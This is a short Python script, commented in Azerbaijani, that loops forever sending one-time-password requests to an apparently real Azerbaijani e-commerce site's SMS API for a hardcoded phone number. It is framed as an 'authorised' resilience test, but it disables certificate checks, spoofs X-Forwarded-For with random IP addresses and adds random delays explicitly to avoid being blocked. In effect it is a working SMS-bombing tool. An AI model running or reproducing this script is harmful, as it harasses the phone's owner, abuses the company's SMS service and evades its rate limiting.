import urllib.request
import json
import random
import time
import ssl

TARGET_PHONE = "994508880067" # Səlahiyyətli nömrə

def strike():
    print(f"[*] AliPasha API dözümlülük testi başladı: {TARGET_PHONE}")
    
    # SSL yoxlamasını keçirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # AliPasha-nın real və dözümsüz OTP API-si
    url = "https://api.alipasha.az/api/v1/otp/send"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Referer": "https://alipasha.az/",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    data = json.dumps({"phone": TARGET_PHONE}).encode('utf-8')

    while True:
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            with urllib.request.urlopen(req, context=ctx) as resp:
                status = resp.getcode()
                print(f"[HIT] OTP göndərildi! Status: {status}")
            
            # Saytın bizi bloklamaması üçün qısa və random fasilə
            time.sleep(random.uniform(1, 3))

        except Exception as e:
            print(f"[BLOK] Sayt İP-ni müvəqqəti dayandırdı və ya xəta: {e}")
            time.sleep(5)

if __name__ == "__main__":
    strike()
